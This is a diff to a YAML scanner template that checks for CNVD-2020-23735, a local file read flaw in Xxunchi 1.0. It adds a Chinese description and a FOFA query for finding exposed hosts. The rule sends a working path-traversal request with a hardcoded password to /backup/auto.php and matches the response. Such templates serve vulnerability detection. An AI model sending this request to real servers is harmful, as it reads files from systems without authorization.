@@ -1,17 +1,22 @@
 id: CNVD-2020-23735
 
 info:
-    name: Xxunchi Local File read
-    author: 清风明月(www.secbook.info)
-    severity: high
+  name: Xxunchi Local File read
+  author: 清风明月
+  severity: high
+  verified: true
+  description: |
+    Xxunchi 1.0存在本地文件读取漏洞。该漏洞源于系统未对用户输入进行过滤，攻击者可通过构造恶意请求获取服务器上的任意文件。
+    FOFA：body="/backup/auto.php"
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-23735
+  tags: cnvd,cnvd2020,xxunchi
+  created: 2020/12/15
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
-            headers:
-                Accept-Encoding: deflate
-        expression: response.status == 200 && response.body.bcontains(bytes(string("NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"))) && response.body.bcontains(bytes(string("display_errors")))
+  r0:
+    request:
+      method: GET
+      path: /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+    expression: response.status == 200 && response.body.bcontains(bytes(string("NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"))) && response.body.bcontains(bytes(string("display_errors")))
 expression: r0()
-
